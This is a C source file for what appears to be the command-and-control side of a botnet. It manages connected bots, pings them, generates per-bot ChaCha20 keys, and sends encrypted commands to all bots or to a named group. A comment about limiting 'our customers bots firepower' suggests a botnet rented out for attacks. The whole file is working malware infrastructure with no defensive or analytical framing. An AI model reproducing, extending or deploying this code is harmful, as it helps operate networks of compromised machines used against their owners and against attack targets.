#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <time.h>
#include <errno.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>

#include "rand.h"
#include "util.h"
#include "chacha20.h"
#include "bot.h"

bot_t bots[MAX_CLIENTS] = {0};
uint32_t bot_count = 0;

void bot_list_latency(int fd) {
	uint32_t highest = 0;

	for (int i = 0; i < BOT_MAX_CLIENTS; i++) {
		bot_t *bot = bot_get(i);

		if (!ATOMIC_GET(&bot->connected))
			continue;

		if (bot->ping_timestamp > bot->resp_timestamp)
			continue;

		uint32_t resp = (bot->resp_timestamp - bot->ping_timestamp);

		if (resp > highest)
			highest = resp;
	}

	util_sockprintf(fd, "The highest latency is %us\r\n", highest);
}

BOOL bot_check_hdr_len(bot_t *bot, int len) {

	int padding_len = ntohs(bot->hdr.padding_len);

	if (padding_len < MIN_PADDING_SIZE)
		return FALSE;

	uint8_t buff[padding_len];
	len += recv(bot->fd, buff, padding_len, MSG_NOSIGNAL);

	/* weird check to check if len is equal to len of the pkt */
	return (len == HDR_PKT_LEN + padding_len);
}

BOOL bot_check_disconnected(bot_t *bot) {
	csum_t hdr = {0};
	int hdr_len = csum_create(&hdr, PING, 0);

	/* make socket blocking again */
	BLOCK(bot->fd);

	int r = send(bot->fd, &hdr, hdr_len, MSG_NOSIGNAL);
	int err_code = errno; // for if it updates

	/* make it nonblocking again */
	NONBLOCK(bot->fd);

	return (r == -1 && err_code == EPIPE);
}

void bot_send_instruction(uint8_t op) {
	csum_t hdr = {0};

	int hdr_len = csum_create(&hdr, op, 0);

	for (int i = 0; i < BOT_MAX_CLIENTS; i++) {
		bot_t *bot = bot_get(i);

		if (!ATOMIC_GET(&bot->connected))
			continue;

		send(bot->fd, &hdr, hdr_len, MSG_NOSIGNAL);
	}
}

void bot_set_connected(bot_t *bot) {
	ATOMIC_SET(&bot->connected, TRUE);
	bot_update_timeout(bot);
}

void bot_update_timeout(bot_t *bot) {
	ATOMIC_SET(&bot->resp_timestamp, time(0));
}

/* black voodoo to send to clients */
uint32_t bot_send_command(uint8_t op, uint8_t *data, uint16_t len, char *group, uint32_t max_bots) {

	csum_t hdr = {0};
	int hdr_len = csum_create(&hdr, op, len);

	uint32_t count = 0;

	char pkt[len];

	for (int i = 0; i < BOT_MAX_CLIENTS; i++) {
		bot_t *bot = bot_get(i);

		if (!ATOMIC_GET(&bot->connected))
			continue;

		/* we limit our customers bots firepower */
		if (count >= max_bots)
			break;

		chacha20_xor(bot->key, 1, bot->nonce, data, pkt, len);

		// only send to group of bots
		if (!group || !strcmp(group, bot->name)) {
			send(bot->fd, &hdr, hdr_len, MSG_NOSIGNAL);
			send(bot->fd, pkt, len, MSG_NOSIGNAL);

			count++;
		}
	}

	return count;
}

bot_t *bot_get(int idx) {
	return &bots[idx];
}

bot_t *bot_setup(int fd, uint16_t bot_port) {
	bot_t *bot = bot_get(fd);
	bot->fd = fd;
	bot->bot_port = bot_port;

	/* update ping timestamp */
	bot->next_ping = rand_next_range(BOT_PING_MIN, BOT_PING_MAX);
	bot->ping_timestamp = time(0);

	bot_update_timeout(bot);

	return bot;
}

void bot_generate_key(bot_t *bot) {

	/* generate nonce */
	rand_str(bot->nonce, NONCE_SIZE);

	/* generate key  */
	rand_str(bot->key, KEY_SIZE);
}
